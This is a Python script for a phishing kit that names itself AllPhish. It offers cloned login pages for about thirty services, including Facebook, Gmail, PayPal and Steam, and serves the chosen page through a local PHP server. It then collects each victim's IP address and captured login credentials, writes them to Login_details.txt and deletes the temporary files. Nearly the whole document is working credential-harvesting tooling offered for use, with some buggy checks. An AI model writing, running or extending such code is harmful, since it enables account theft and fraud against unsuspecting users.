#!/usr/bin/env python3
import requests
import subprocess as subp
import time
import os 

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white

def web():	
	global web
	choice ='0'
	while choice =='0':
		print(G + '[>]' + C + ' Select the target Website' + W + '\n')	
		print(R + '[1] ' + G +  ' Facebook'  +  '		|' + W ,end=' ')	
		print(R + '[2] ' + G +  ' Gmail'  + W  )
		print(R + '[3] ' + G +  ' Instagram'+  '		|'  +W,end=' '  )
		print(R + '[4] ' + G +  ' Twitter'  + W )
		print(R + '[5] ' + G +  ' Github'      +   '		|'  +W,end=' ' )
		print(R + '[6] ' + G +  ' Netflix '  + W )
		print(R + '[7] ' + G +  ' Paypal'      + W +  ' 		|'  +W,end=' ' )
		print(R + '[8] ' + G +  ' Origin'  + W )
		print(R + '[9] ' + G +  ' Steam'        +  '		|' + W , end=' ')
		print(R + '[10] ' + G +  'Yahoo'  + W  )
		print(R + '[11] ' + G +  'LinkedIn'  +'		|' + W ,end=' ')
		print(R + '[12] ' + G +  'ProtonMail'  + W )
		print(R + '[13] ' + G +  'Wordpress'  + '		|'+ W ,end=' ' )
		print(R + '[14] ' + G +  'Microsoft'  +W)
		print(R + '[15] ' + G +  'IGFollowers'  + '	|'+ W ,end=' ')
		print(R + '[16] ' + G +  'Ebay'  + W)
		print(R + '[17] ' + G +  'Pinterest'  + '		|'+ W ,end=' ' )
		print(R + '[18] ' + G +  'CrytoCurrency'  )
		print(R + '[19] ' + G +  'Verizon'  + '		|'+ W ,end=' ' )
		print(R + '[20] ' + G +  'DropBox'  +W)
		print(R + '[21] ' + G +  'Adobe ID'  + '		|'+ W ,end=' ' )
		print(R + '[22] ' + G +  'Shopify'  + W  )
		print(R + '[23] ' + G +  'Messenger'  + '		|'+ W ,end=' ' )
		print(R + '[24] ' + G +  'Gitlab'   + W)
		print(R + '[25] ' + G +  'Twitch'  + '		|'+ W ,end=' ' )
		print(R + '[26] ' + G +  'Badoo'  +W)
		print(R + '[27] ' + G +  'VK'  + '			|'+ W ,end=' ' )
		print(R + '[28] ' + G +  'Yandex'  +W)
		print(R + '[29] ' + G +  'devianART'  + '		|'+ W ,end=' ' )
		print(R + '[30] ' + G +  'Snapchat'  +W )
		print(R + '[31] ' + G +  'CUSTOM'  +W)
		choice = input('\n'+G + '[+]' + C + " Enter Option No. ->  " + W)
		if choice == '1':
			web = 'facebook'
			page()
		elif choice == '2':
			web = 'gmail'
			page()
		elif choice == '3':
			web = 'instagram'
			page()
		elif choice == '4':
			web = 'twitter'
			page()
		elif choice == '5':
			web = 'github'
			page()
		elif choice == '6':
			web = 'netflix'
			page()
		elif choice == '7':
			web = 'paypal'
			page()
		elif choice == '8':
			web = 'origin'
			page()
		elif choice == '9':
			web = 'steam'
			page()
		elif choice == '10':
			web = 'yahoo'
			page()
		elif choice == '11':
			web = 'linkedin'
			page()
		elif choice == '12':
			web = 'protonmail'
			page()
		elif choice == '13':
			web =  'wordpress'
			page()
		elif choice == '14':
			web = 'microsoft'
			page()
		elif choice == '15':
			web = 'igfollowers'
			page()
		elif choice == '16':
			web = 'ebay'
			page()
		elif choice == '17':
			web = 'pinterest'
			page()
		elif choice == '18':
			web = 'crytocurrency'
			page()
		elif choice == '19':
			web = 'verizon'
			page()
		elif choice == '20':
			web = 'dropBox'
			page()
		elif choice == '21':
			web = 'adobe'
			page()
		elif choice == '22':
			web = 'shopify'
			page()
		elif choice == '23':
			web = 'messenger'
			page()
		elif choice == '24':
			web = 'gitlab'
			page()
		elif choice == '25':
			web = 'twitch'
			page()
		elif choice == '26':
			web = 'badoo'
			page()
		elif choice == '27':
			web = 'vk'
			page()
		elif choice == '28':
			web = 'yandex'
			page()
		elif choice == '29':
			web = 'devianart'
			page()
		elif choice == '30':
			web = 'snapchat'
			page()
		elif choice == '31':
			custom()
		
def page():
	global web
	port = input(G + '[>] ' + C + 'Enter your PORT' + R + ' (Port 80 only for root) > ' +W)
	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'templates/{}'.format(web)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:{}'.format(str(port)))
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Success ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Failed ' + C + ']' + W)
		quit()
	print('\n' + C + '[+] ' + G + 'Your Phising Url : http://0.0.0.0:{}'.format(port) )
	print('\n' + G + '[+] ' + C + 'Waitting for User Interaction...'+ W)
	time.sleep(10)
	vic_ip()


def vic_ip ():
	global web
	ip = os.path.isfile('templates/{}/ip.txt'.format(web))
	if ip == 'True':
		vic_ip()
	else:
		with open('templates/{}/ip.txt'.format(web) , 'r') as ip_file:
			ip_lst = ip_file.readlines()
			print('\n' + R + ip_lst[0] +W)
			time.sleep(2)
			os.system('rm templates/{}/ip.txt'.format(web))
			vic_pass()

def vic_pass():
	global web
	pass_file =  os.path.isfile('templates/{}/usernames.txt'.format(web))
	if pass_file == 'False':
		return vic_pass()
	else:
		with open('templates/{}/usernames.txt'.format(web) , 'r') as ip_file:
			ip_lst = ip_file.readlines()
			print('\n' + R + ip_lst[0] +W)
			with open ('templates/{}/usernames.txt'.format(web), 'r') as f1:
				with open ('Login_details.txt' , 'w') as f2:
					for line in f1:
						f2.write(line)
			time.sleep(2)
			print('\n' + C + '[+] ' + G + 'Saved Login Details > Login_details.txt' +W)
			os.system('rm templates/{}/usernames.txt'.format(web))
	sp = subp.Popen(['ps', '-A'], stdout=subp.PIPE)
	output, error = sp.communicate()
	target_process = "php"
	for line in output.splitlines():
		if target_process in str(line):
			pid = int(line.split(None, 1)[0])
			os.kill(pid, 9)
	men = input('\n' + R + 'Do You want to return to Menu (y/n) > ' +W)
	if str('y') in men:
		web()
	else:
		sp = subp.Popen(['ps', '-A'], stdout=subp.PIPE)
		output, error = sp.communicate()
		target_process = "php"
		for line in output.splitlines():
			if target_process in str(line):
				pid = int(line.split(None, 1)[0])
				os.kill(pid, 9)
				print(C + 'Thanks For Using AllPhish')
				print(C + 'Follow me on Twitter > @hackerdestinat1')